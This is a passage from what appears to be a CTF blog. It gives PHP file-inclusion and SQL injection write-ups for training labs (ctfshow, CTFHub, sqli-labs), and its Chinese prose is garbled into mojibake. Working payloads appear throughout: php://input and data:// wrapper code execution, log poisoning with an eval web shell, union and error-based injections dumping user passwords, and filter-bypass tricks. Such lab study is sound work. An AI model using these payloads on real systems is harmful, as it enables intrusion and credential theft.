æ³¨æ„ï¼šå½“ä¸è¯´æ˜ä½¿ç”¨file:åè®®æ—¶ï¼ˆå³é»˜è®¤file:åè®®çš„æƒ…å†µï¼‰å¯ä»¥ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œå½“ä½¿ç”¨äº†fileåè®®æ—¶æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„ 4.php:åœ¨allow_url_fopenï¼Œallow_url_include(:ä»…php://input ã€php://stdinã€php://memoryã€php://temp éœ€è¦on)éƒ½å…³é—­çš„æƒ…å†µä¸‹å¯ä»¥æ­£å¸¸ä½¿ç”¨php:ä½œç”¨ä¸ºè®¿é—®è¾“å…¥è¾“å‡ºæµ 5.php:inputphp:inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ ä¾‹å¦‚ï¼š http://127.0.0.1/cmd.php?cmd=php://inputPOSTæ•°æ®ï¼š?php phpinfo()? æ³¨æ„ï¼šå½“enctype=multipart/form-dataçš„æ—¶å€™ php://inputæ˜¯æ— æ•ˆçš„ é‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚ 6.zip:zip: å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip:æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ 7.http:è®¿é—® HTTP(s) ç½‘å€ æ¡ä»¶ï¼š allow_url_fopen:on allow_url_include:on ä½œç”¨ï¼šå¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ HTTP 1.0 çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«ã€‚ ä½¿ç”¨ç¤ºä¾‹ï¼šä»¥ä¼ å‚å˜é‡åä¸ºcmdæ¼”ç¤º PHPcmd=http://example.com/phpinfo.txt\t#è¯»å–http://example.com/phpinfo.txtæ–‡ä»¶cmd=https://example.com/file.php?var1=val1var2=val2\t#è¯»å–https://example.com/file.phpæ–‡ä»¶å¹¶ä¸”ä¼ å…¥var1å’Œvar2çš„å€¼ CTFshowweb78?phpif(isset($_GET[file])) $file = $_GET[file]; include($file);else highlight_file(__FILE__); ä¸€é“ç»å…¸çš„æ–‡ä»¶åŒ…å«é¢˜ç›® é¦–å…ˆæˆ‘ä»¬getä¼ å‚ï¼š?file=/../../../../../etc/passwdï¼Œå›æ˜¾è¯´æ˜å¯ä»¥æ–‡ä»¶åŒ…å«ï¼ˆå½“ç„¶è¿™é¢˜å¯ä»¥ç›´æ¥è·³è¿‡è¿™ä¸ªæ­¥éª¤ï¼‰ ç„¶åå°±æ˜¯åˆ©ç”¨phpä¼ªåè®®æ¥è·å–æ‰€éœ€çš„æ–‡ä»¶ï¼š?file=php://filter/convert.base64-encode/resource=flag.php web79?phpif(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); include($file);else highlight_file(__FILE__); æ ¹æ®ä»£ç æ‰€ç¤ºå‡ºç°phpä¼šè¢«é—®å·ä»£æ›¿ ç”±äºæœ‰includeå‡½æ•°ï¼Œæ‰€ä»¥è”æƒ³åˆ°ä¼ªåè®®data://ï¼Œç„¶ååˆ©ç”¨çŸ­æ ‡ç­¾æ¥å†™phpä»£ç  é¦–å…ˆæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š?file=data://text/plain,?=system(ls);?ï¼Œç›®å½•ä¸‹æœ‰ä¸ªFlagæ–‡ä»¶ æ¥ç€æ‰“å°å‡ºè¯¥æ–‡ä»¶ï¼ˆç”¨base64ç¼–ç ä¸€ä¸‹ï¼‰ï¼š?file=data://text/plain,?=system(cat flag*|base64);? æ‹¿å»è§£ç ï¼Œå¾—åˆ°æ‰€è¦çš„flag web80?phpif(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); $file = str_replace(data, ???, $file); include($file);else highlight_file(__FILE__); ç”¨æ—¥å¿—åŒ…å«æ¥ç»•è¿‡ é¦–å…ˆç”¨bpæŠ“åŒ…ï¼Œå°è¯•è®¿é—®ï¼š/../../../../etc/passwdï¼Œéƒ¨åˆ†å›æ˜¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä»ä¸­å¯ä»¥çŸ¥é“ç”¨çš„æ˜¯nginxï¼Œè€Œnginxé»˜è®¤æ—¥å¿—è·¯å¾„ /var/log/nginx/access.log æ‰€ä»¥æˆ‘ä»¬å°è¯•è®¿é—®ï¼š?file=/var/log/nginx/access.logï¼ŒæˆåŠŸ ç„¶ååœ¨UAå¤´å¤„è¾“å…¥ä»£ç ï¼š?php @eval($_POST[shell]);?ï¼ˆè®°ä½è¦æ˜¯å•å¼•å·ï¼ŒåŒå¼•å·ä¼šè¢«è½¬ä¹‰æ‰ï¼‰ ç„¶åç”¨èšå‰‘è¿æ¥ä¸Šï¼Œé¢˜ç›®è§£å†³ ç¬¬äºŒç§æ–¹æ³•ï¼šå¯ä»¥å¤§å°å†™ç»•è¿‡ï¼š?file=PHP://input web81?phpif(isset($_GET[file])) $file = $_GET[file]; $file = str_replace(php, ???, $file); $file = str_replace(data, ???, $file); $file = str_replace(:, ???, $file); include($file);else highlight_file(__FILE__); æŒ‰ç…§ä¸Šé¢˜çš„æ—¥å¿—åŒ…å«è§£å†³é¢˜ç›® CTFHubRCE-æ–‡ä»¶åŒ…å«?phperror_reporting(0);if (isset($_GET[file])) if (!strpos($_GET[file], flag)) include $_GET[file]; else echo Hacker!!!; else highlight_file(__FILE__);?hri have a a href=shell.txtshell/a, how to use it ? åˆ©ç”¨é¢˜ç›®æä¾›çš„shell.txtæ¥è¿›è¡Œç»•è¿‡ï¼š?file=shell.txt æ ¹æ®è¯¥æ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œpostä¼ å‚ï¼šctfhub=system(cat /flag); é¢˜ç›®è§£å†³ php:input?phpif (isset($_GET[file])) if ( substr($_GET[file], 0, 6) === php:// ) include($_GET[file]); else echo Hacker!!!; else highlight_file(__FILE__);?hri dont have shell, how to get flag? bra href=phpinfo.phpphpinfo/a é€šè¿‡æŸ¥çœ‹é¢˜ç›®ç»™çš„phpinfoï¼Œæœ‰å¦‚ä¸‹å‘ç°ï¼š è¿™è¯´æ˜äº†å¯ä»¥ä½¿ç”¨php:input ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨php://inputï¼Œå¦‚ä¸‹ï¼š å¾—åˆ°æ‰€éœ€æ–‡ä»¶åœ°å€ï¼Œæ‰“å°å‡ºæ¥ï¼Œé¢˜ç›®è§£å†³ è¿œç¨‹åŒ…å«?phperror_reporting(0);if (isset($_GET[file])) if (!strpos($_GET[file], flag)) include $_GET[file]; else echo Hacker!!!; else highlight_file(__FILE__);?hri dont have shell, how to get flag?bra href=phpinfo.phpphpinfo/a if (!strpos($_GET[file], flag))å‘ç°é¢˜ç›®è¦æ±‚å¿…é¡»ä½¿ç”¨éå«flagçš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œåˆ™æ­¤æ—¶å¯ä»¥è€ƒè™‘è¿›è¡Œè¿œç¨‹åŒ…å«ã€‚åœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹ä¸€ä¸ªtxtæ–‡ä»¶ï¼ˆä¸èƒ½æ˜¯phpæ–‡ä»¶å“Ÿï¼‰ï¼Œå¦‚ä¸‹ï¼š ?php system(ls /);? å¾—åˆ°æ ¹ç›®å½•ä¸Šé¢çš„æ–‡ä»¶åˆ—è¡¨ï¼Œç„¶åæ‰“å°å‡ºæˆ‘ä»¬æ‰€éœ€çš„æ–‡ä»¶ ?php system(cat /flag);? å¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³ è¯»å–æºä»£ç ?phperror_reporting(E_ALL);if (isset($_GET[file])) if ( substr($_GET[file], 0, 6) === php:// ) include($_GET[file]); else echo Hacker!!!; else highlight_file(__FILE__);?hri dont have shell, how to get flag? brflag in code/flag/code ä½¿ç”¨phpä¼ªåè®®ä¸­çš„ php://filteræ¥è¯»å–flagæ–‡ä»¶ï¼Œé¢˜ç›®è§£å†³","tags":["web","å‰ç«¯"],"categories":["CTF"]},{"title":"sqlæ³¨å…¥å¿ƒå¾—","path":"/2023/11/19/sqlæ³¨å…¥å¿ƒå¾—_max/sqlæ³¨å…¥å¿ƒå¾—/","content":"åŸºç¡€åœ¨å­¦ä¹ SQLæ³¨å…¥æ¼æ´ä¹‹å‰ï¼Œå…ˆå­¦ä¹ ä¸€ä¸ªç›¸å…³çš„çŸ¥è¯†ç‚¹ã€‚åœ¨MySQL 5.0ç‰ˆæœ¬ä¹‹åï¼ŒMySQLé»˜è®¤åœ¨æ•°æ®åº“ä¸­å­˜æ”¾ä¸€ä¸ªâ€œinformation_schemaâ€çš„æ•°æ®åº“ï¼Œåœ¨è¯¥åº“ä¸­ï¼Œéœ€è¦è®°ä½ä¸‰ä¸ªè¡¨åï¼Œåˆ†åˆ«æ˜¯ï¼šschemataã€tablesã€columnsã€‚ 1.schemataè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€‚ å…¶ä¸­è®°å½•****æ•°æ®åº“åº“åçš„å­—æ®µåä¸º*ï¼š*schemata_name****ã€‚ 2.tablesè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åå’Œè¡¨åã€‚ å…¶ä¸­è®°å½•****æ•°æ®åº“åº“å*å’Œ*è¡¨åçš„å­—æ®µååˆ†åˆ«æ˜¯*ï¼š*table_schema*å’Œ*table_name****ã€‚ 3.columnsè¡¨å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€è¡¨åå’Œå­—æ®µåã€‚ å…¶ä¸­è®°å½•****æ•°æ®åº“åº“åã€è¡¨åå’Œå­—æ®µåçš„å­—æ®µååˆ†åˆ«æ˜¯*ï¼š*tables_schema*ã€*table_name*å’Œ*column_name****ã€‚ *information_schema.tablesï¼šæ•°æ®åº“çš„è¡¨å* *information_schema.columnsï¼šæ•°æ®åº“çš„åˆ—å* æ³¨é‡Šç¬¦ï¼š åœ¨MySQLä¸­ï¼Œå¸¸è§æ³¨é‡Šç¬¦çš„è¡¨è¾¾æ–¹å¼ï¼š # ......ï¼š#å·åé¢çš„éƒ½ä¼šè¢«æ³¨é‡Š -- ...... ï¼šâ€“å·åé¢çš„éƒ½ä¼šè¢«æ³¨é‡Šï¼Œä¸è¿‡åœ¨ â€“ çš„å‰åéƒ½éœ€è¦åŠ ç©ºæ ¼å†åŠ æ•°æ® /\\* ... \\*/ ï¼šå†…è”æ³¨é‡Šï¼Œå†…è”æ³¨é‡Šå¯ä»¥ç”¨äºæ•´ä¸ªSQLè¯­å¥ä¸­ï¼Œç”¨æ¥æ‰§è¡ŒSQLè¯­å¥ã€‚ ä¾‹å¦‚ï¼šindex?id-10 !union !select 1,2,3 æ³¨å…¥ä¸­çš„å¸¸ç”¨å‡½æ•°ä»¥åŠå‘½ä»¤1.union ç”¨æ¥åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªselectè¯­å¥æŸ¥è¯¢çš„ç»“æœ è¯­æ³•ï¼šselect column_name from table_name1 union select column_name from table_name2 æ³¨æ„ï¼šunionå†…éƒ¨çš„selectè¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯æ¡selectè¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»æ˜¯ç›¸åŒçš„ 2.order by é»˜è®¤å‡åºï¼Œå¦‚æœå¸Œæœ›æŒ‰ç…§é™åºå¯¹è®°å½•è¿›è¡Œæ’åºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨descå…³é”®å­—ï¼ˆorder byè¢«æ­£åˆ™è¿‡æ»¤æ‰çš„è¯ï¼Œæ˜¯å¯ä»¥ç”¨descæ¥è¿›è¡Œåˆ¤æ–­å­—æ®µï¼‰ ä¾‹å¦‚ï¼šorder by 1æˆ–è€…order by 2ä¸­å…¶å®1è¡¨ç¤ºç¬¬ä¸€ä¸ªæ ä½ï¼Œ2è¡¨ç¤ºç¬¬äºŒä¸ªæ ä½ã€‚å¦‚æœå½“è¡¨ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µåˆ—æ—¶ï¼Œorder by 3å°±ä¼šæŠ¥é”™ï¼Œå°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼æ¥åˆ¤æ–­å­—æ®µæ•° 3.concat å°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸² è¯­æ³•ï¼šconcat(str1,str2) æ³¨æ„ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnull 4.goup_concat() è¯¥å‡½æ•°è¿”å›å¸¦æœ‰æ¥è‡ªä¸€ä¸ªç»„çš„è¿æ¥çš„éNULLå€¼çš„å­—ç¬¦ä¸²ç»“æœã€‚ *åŠŸèƒ½ï¼šå°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“æœã€‚* è¯­æ³•ï¼šgroup_concat( [distinct]è¦è¿æ¥çš„å­—æ®µ[order by æ’åºå­—æ®µ asc/desc] [separatorâ€˜åˆ†éš”ç¬¦â€™]) è¯´æ˜ï¼šdistinctå¯ä»¥æ’é™¤é‡å¤å€¼ï¼Œorder byå­å¥å¯ä»¥å¯¹ç»“æœä¸­çš„å€¼è¿›è¡Œè·‘å¾ï¼Œseparatoræ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ï¼Œç¼ºçœä¸ºä¸€ä¸ªé€—å·ã€‚ 5.***substr()***ï¼šç”¨æ¥æˆªå–æ•°æ®åº“ä¸­æŸä¸ªå­—æ®µçš„ä¸€éƒ¨åˆ† è¯­æ³•ï¼šsubstr(stringï¼Œstartï¼Œlength) å‚æ•°ï¼šstringï¼šå¿…é€‰ï¼Œæ•°æ®åº“ä¸­éœ€è¦æˆªå–çš„å­—æ®µ startï¼šå¿…é€‰ã€‚æ­£æ•°ï¼Œä»å­—ç¬¦ä¸²æŒ‡å®šä½ç½®å¼€å§‹æˆªå–ï¼›è´Ÿæ•°ï¼Œä»å­—ç¬¦ä¸²ç»“å°¾æŒ‡å®šä½ç½®å¼€å§‹æˆªå–ï¼›0ï¼Œåœ¨å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªä½ç½®å¼€å§‹æˆªå–ã€‚ lengthï¼šå¯é€‰ï¼Œéœ€è¦æˆªå–çš„é•¿åº¦ã€‚ç¼ºçœã€‚å³æˆªå–åˆ°ç»“æŸä½ç½® ***6.ascii(str)***ï¼šè¿”å›å­—ç¬¦ä¸²æœ€å·¦è¾¹çš„æ•°å€¼ è¯­æ³•ï¼šascii(str) ***7.database()***ï¼šå½“å‰ä½¿ç”¨çš„æ•°æ®åº“ select database() åˆ¤æ–­é—­åˆå½¢å¼ç»•è¿‡çš„ä¸‡èƒ½å¯†é’¥ï¼š1 or 1=1è¿™æ ·ä¸»è¦æ˜¯æ‹¿æ¥åˆ¤æ–­æˆåŠŸç™»å½•æ—¶ä¼šæœ‰ä»€ä¹ˆååº” é¦–å…ˆå°è¯•ï¼š ?id=1â€™?id=1â€ 1.å¦‚æœéƒ½æŠ¥é”™ï¼Œåˆ™ä¸ºæ•´å½¢é—­åˆã€‚ 2.å¦‚æœå•å¼•å·æŠ¥é”™ï¼ŒåŒå¼•å·ä¸æŠ¥é”™ã€‚ ç„¶åå°è¯•:?id=1â€™â€“-+ æ— æŠ¥é”™åˆ™å•å¼•å·é—­åˆï¼ŒæŠ¥é”™åˆ™å•å¼•å·åŠ æ‹¬å·ã€‚ 3å¦‚æœå•å¼•å·ä¸æŠ¥é”™ï¼ŒåŒå¼•å·æŠ¥é”™ã€‚ ç„¶åå°è¯•ï¼š?id=1â€“-+ æ— æŠ¥é”™åˆ™åŒå¼•å·é—­åˆï¼ŒæŠ¥é”™åˆ™åŒå¼•å·åŠ æ‹¬å·ã€‚ å¤šå±‚æ‹¬å·åŒç† ç»•è¿‡æ–¹å¼å¤§å°å†™ç»•è¿‡ï¼š æ¯”å¦‚è¿‡æ»¤selectæ—¶ï¼Œåœ¨ä¸åŒºåˆ†å¤§å°å†™æ—¶å€™å¯ä»¥Selectç»•è¿‡ åŒå†™ç»•è¿‡ï¼š è¿‡æ»¤å…³é”®å­—å¯ä»¥ç”¨selselctectæ¥ç»•è¿‡ *ç©ºæ ¼*****ç»•è¿‡****ï¼š 1 /**/ å¯ä»¥ä»£æ›¿ç©ºæ ¼å½“ç©ºæ ¼è¢«è¿‡æ»¤çš„æ—¶å€™ ä¾‹å¦‚ï¼šselect/**/user/**/from/**/users; 2å¯ä»¥ä½¿ç”¨Tabä»£æ›¿ç©ºæ ¼ 3å¯ä»¥ä½¿ç”¨ç©ºæ ¼urlç¼–ç %20 4å¦‚æœç©ºæ ¼è¢«è¿‡æ»¤ï¼Œæ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨æ‹¬å·ç»•è¿‡ ä¾‹å¦‚ï¼šselect(user)from(users); å½“=è¢«è¿‡æ»¤æ—¶ï¼šå¯ä»¥ç”¨likeæˆ–rlikeï¼Œä¹Ÿå¯ä»¥ç”¨regexpï¼ˆæ­£åˆ™æ¥åŒ¹é…ï¼‰æ¥ç»•è¿‡ æ¯”å¦‚â€™adminâ€™ å°±å¯ä»¥like â€˜adminâ€™ ****selectè¢«è¿‡æ»¤æ—¶ï¼š****å¯ä»¥ä½¿ç”¨descå€’åºæŸ¥çœ‹è¡¨å†…çš„å­—æ®µï¼Œä¹Ÿå¯ä»¥show columns from è¡¨åã€‚ å½“éœ€è¦æŸ¥çœ‹å…·ä½“ä¿¡æ¯çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆ1.5 å †å æ³¨å…¥æŸ¥è¯¢ï¼‰ ****ç¼–ç ç»•è¿‡ï¼š****ä¸¤æ¬¡URLå…¨ç¼–ç  fuzzè„šæœ¬ï¼ˆå¥½ä¸œè¥¿ï¼‰getä¼ å‚ import requestssql_char = [select, union, and, or, sleep, where, from, limit, group, by, like, prepare, as, if, char, ascii, mid, left, right, substring, handler, updatexml, extractvalue, benchmark, insert, update, all, @, #, ^, , *, \\, , ~, `, (, ), --, =, /, \\\\, ]for char in sql_char:\tres = requests.get(http://127.0.0.1/get.php?query=+char+submit2=sbumit)\tif Illegal Char in res.text: print(è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: 0.format(char))\telse: print(é€šè¿‡: 0.format(char)) postä¼ å‚ import requestssql_char = [select, union, and, or, sleep, where, from, limit, group, by, like, prepare, as, if, char, ascii, mid, left, right, substring, handler, updatexml, extractvalue, benchmark, insert, update, all, @, #, ^, , *, \\, , ~, `, (, ), --, =, /, \\\\, ]url = http://127.0.0.1/get.phpheader = Host:127.0.0.1,\tUser-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0,\tAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,\tAccept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,\tAccept-Encoding:gzip, deflate,\tContent-Type:application/x-www-form-urlencodedfor char in sql_char:\tpost_data = query=test+char+submit2=sbumit\tres = requests.post(url,data=post_data,headers=header)\tif Illegal Char in res.text: print(è¯¥å­—ç¬¦æ˜¯éæ³•å­—ç¬¦: 0.format(char))\telse: print(é€šè¿‡: 0.format(char)) unionæ³¨å…¥getä¼ å‚ä½¿ç”¨ --+æ¥æ³¨é‡Šæ‰åé¢çš„ä»£ç ï¼Œæˆ–è€… %23ï¼ˆè¿™ä¸ªæ˜¯#çš„urlç¼–ç ï¼‰ postä¼ å‚ä½¿ç”¨ #æ¥æ³¨é‡Šæ‰åé¢çš„ä»£ç  less-1é¦–å…ˆé¢˜ç›®ä¸ºgetä¼ å‚ï¼Œé€šè¿‡æµ‹è¯•å¯ä»¥åˆ¤æ–­å‡ºæ˜¯å•å¼•å·é—­åˆï¼Œå¼€å§‹æ³¨å…¥ ?id=1 order by 4 --+ï¼šé€šè¿‡è¿™ä¸ªåˆ¤æ–­å‡ºå­—æ®µæ•°ä¸º3 ?id=1 and 1=2 union select 1,2,database() --+ï¼šçˆ†å‡ºæ•°æ®åº“å æˆ–è€…?id=1 and 1=2 union select 1,2, group_concat(schema_name) from information_schema.schamata --+ ?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=security--+ï¼šçˆ†å‡ºæ‰€æœ‰è¡¨å ?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users--+ï¼šçˆ†å‡ºä¸€ä¸ªè¡¨çš„æ‰€æœ‰å­—æ®µå ?id=1 and 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+çˆ†å‡ºç”¨æˆ·åå’Œå¯†ç ï¼Œè¿™æ ·å­çˆ†å‡ºæ¥çœ‹çš„æ›´åŠ æ•´æ´ä¸€ç‚¹ less-2less-3less-4less-25less-25aless-2:getä¼ å‚ï¼Œæµ‹è¯•å‡ºä¸ºæ•´å½¢é—­åˆï¼Œæ¥ä¸‹æ¥çš„æ“ä½œå’Œless-1çš„æ­¥éª¤ä¸€æ · less-3:getä¼ å‚ï¼Œæµ‹è¯•å‡ºä¸ºå•å¼•å·åŠ æ‹¬å·é—­åˆï¼Œæ¥ä¸‹æ¥æ“ä½œä¸ç”¨å¤šè¯´äº† less-4:getä¼ å‚ï¼Œæµ‹è¯•å‡ºä¸ºåŒå¼•å·åŠ æ‹¬å·é—­åˆï¼Œæ¥ä¸‹æ¥æ“ä½œä¸€è‡´ less-25:å•å¼•å·é—­åˆï¼Œå¦‚æœæœ‰ç”¨åˆ°oræˆ–è€…andè¦è®°å¾—åŒå†™ less-25a:æ•´å½¢é—­åˆï¼Œå¦‚æœæœ‰ç”¨åˆ°oræˆ–è€…andè¦è®°å¾—åŒå†™ less-11less-12less-11:postä¼ å‚ï¼Œå•å¼•å·é—­åˆ less-12:postä¼ å‚ï¼ŒåŒå¼•å·åŠ æ‹¬å·é—­åˆ less-20less-21less-22$cookee = $_COOKIE[uname]; $format = D d M Y - H:i:s; $timestamp = time() + 3600; echo YOUR COOKIE : uname = $cookee and expires: . date($format, $timestamp); echo br/font; $sql=SELECT * FROM users WHERE username=$cookee LIMIT 0,1; åˆ©ç”¨æ­£ç¡®è´¦å·å¯†ç ç™»å½•è¿›å»ï¼Œå†åˆ©ç”¨cookieè¿›è¡Œæ³¨å…¥æ“ä½œï¼Œå•å¼•å·é—­åˆ less-21ï¼šå•å¼•å·åŠ æ‹¬å·é—­åˆï¼Œcookieå†…å®¹è¦base64ç¼–ç  less-22ï¼šåŒå¼•å·é—­åˆ less-23$reg = /#/;$reg1 = /--/;$replace = ;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=SELECT * FROM users WHERE id=$id LIMIT 0,1; è¦åœ¨ä¸ç”¨æ³¨é‡Šç¬¦å·çš„æƒ…å†µä¸‹å®Œæˆæ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®©å‰åä¸¤ä¸ªå•å¼•å·éƒ½å®Œæˆé—­åˆã€‚ä¾‹å­å¦‚ä¸‹ï¼š ?id=-1 union select 1,database(),3 less-26ï¼ˆä¸é—´æ–­ç©ºæ ¼ï¼‰less-26aless-27less-27aless-28less-28aå•å¼•å·é—­åˆï¼Œè¿‡æ»¤äº† orï¼Œand ï¼Œ * , â€“ , # , ç©ºæ ¼ , ?id=123union%A0select%A01,2,3 %A0 æ˜¯ä¸é—´æ–­ç©ºæ ¼ï¼ˆnon-breaking spaceï¼‰çš„ URL ç¼–ç è¡¨ç¤º less-26aï¼šå’Œä¸Šä¸€é¢˜ç›¸æ¯”å°±æ˜¯å¤šåŠ äº†ä¸€ä¸ªæ‹¬å· ?id=100)union%a0select%a01,2,3||(3 less-27ï¼šåœ¨ä¸Šé¢ä¸€é¢˜çš„åŸºç¡€ä¸Šå†åŠ ä¸Šå¤§å°å†™æ··å†™ less-27aï¼šåœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šå•å¼•å·å˜æˆäº†åŒå¼•å· less-29less-30less-31åˆ°è¯¥é¢˜æ£€éªŒçš„æ–¹å¼å°±åˆå˜äº†ï¼ŒæŸ¥çœ‹login.phpæ–‡ä»¶ï¼Œä¸»è¦æ³¨æ„ä»¥ä¸‹ä¸¤ä¸ªå‡½æ•° å…·ä½“ä»£ç å¦‚ä¸‹ï¼š function whitelist($input)\t$match = preg_match(/^\\d+$/, $input);\tif($match) //echo you are good; //return $match; else header(Location: hacked.php); //echo you are bad;\tfunction java_implimentation($query_string)\t$q_s = $query_string;\t$qs_array= explode(,$q_s);\tforeach($qs_array as $key = $value) $val=substr($value,0,2); if($val==id) $id_value=substr($value,3,30); return $id_value; echo br; break; whitelistå‡½æ•°æ˜¯è¦æ±‚è¾“å…¥çš„å†…å®¹åªèƒ½å¤Ÿæ˜¯æ•°å­—ï¼Œè€Œjava_implimentationå‡½æ•°æ˜¯æ£€æµ‹ç¬¬ä¸€ä¸ªå‰é¢idçš„å†…å®¹ï¼Œæ‰€ä»¥åé¢çš„å†…å®¹ä¼šæ€ä¹ˆåŠï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š å‘ç°å›æ˜¾çš„æ˜¯ç¬¬äºŒä¸ªidçš„å†…å®¹ï¼Œäºæ˜¯å°±æ‰¾åˆ°äº†æ¼æ´ï¼Œåœ¨ç¬¬äºŒä¸ªidåé¢è¿›è¡Œunionæ³¨å…¥ è·å–æ•°æ®åº“åï¼šï¼Ÿidid=0 union all sElect 1,database(),3 --+ å‰©ä¸‹çš„æ­¥éª¤å°±æ˜¯æ™®é€šçš„unionæ³¨å…¥ less-30ï¼šåŒå¼•å·åŒ…è£¹ less-31ï¼šåŒå¼•å·åŠ æ‹¬å·åŒ…è£¹ æŠ¥é”™æ³¨å…¥updatexmlæŠ¥é”™updatexml()å‡½æ•°çš„ä½¿ç”¨ï¼šæ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ï¼Œè¿”å›æ›¿æ¢çš„XMLç‰‡æ®µ è¯­æ³•ï¼šupdatexmlï¼ˆxml_documatï¼ŒXPath_stringï¼Œnew_valueï¼‰ å‚æ•°ï¼š1.xml_documatï¼šæ˜¯STRINGæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œè¿™ä¸€é¡¹å¯ä»¥è¾“å…¥ä¸€ä¸ªåå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œæ¯”å¦‚0x26ï¼ˆï¼‰ã€‚ â€‹ 2.XPath_stringï¼šæ˜¯XPathçš„æ ¼å¼çš„å­—ç¬¦ä¸²ï¼ŒæŠ¥é”™æ³¨å…¥æ—¶éœ€è¦å†™å…¥é”™è¯¯çš„æ ¼å¼æ¥æ˜¾ç¤ºé”™è¯¯çš„ä¿¡æ¯ã€‚ â€‹ 3.new_valueï¼šæ˜¯stringæ ¼å¼æ›¿æ¢æŸ¥æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„æ•°æ®ï¼Œåœ¨æ³¨å…¥æ—¶å¯ä»¥åŠ å…¥ä»»æ„å­—ç¬¦ï¼Œæ¯”å¦‚0x26ï¼ˆï¼‰ã€‚ æ„é€ æ¨¡æ¿æ³¨å…¥è¯­å¥ï¼š select * from major where id=1 and updatexml(1,concat(0x26,(select database()),0x26),3); åŸç†è§£é‡Šï¼šç”±äºupdatexmlçš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä»¥0x26å¼€å¤´çš„å†…å®¹ä¸æ˜¯xmlæ 